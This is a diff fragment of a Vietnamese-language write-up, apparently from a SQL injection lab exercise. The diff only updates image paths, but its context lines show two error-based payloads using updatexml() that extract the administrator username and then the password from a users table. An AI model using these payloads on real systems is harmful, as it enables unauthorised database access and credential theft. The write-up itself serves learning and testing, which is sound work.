@@ -68,11 +68,11 @@ em tiêp tục tăng giá trị lên 1 2 3 4 5 và lần lượt nhận tên cá
 - Sau đó em dùng payload: 'admi'+and+updatexml(null,concat(0x0a,(select+username+from+users+limit+0,1)),null)--
     
 nhận được tên admin là administrator
-![Alt text](image-12.png)
+![Alt text](./imagesErrorBase/image-12.png)
 - cuối cùng em sẽ lấy mật khẩu administrator
 Payload : 'admi'+and+updatexml(null,concat(0x0a,(select+password+from+users+where+username='administrator'+limit+0,1)),null)--
 Và kết quả :
-![Alt text](image-13.png)
+![Alt text](./imagesErrorBase/image-13.png)
 
 -> Vậy là em đã nhận được mật khẩu là hihi123
 
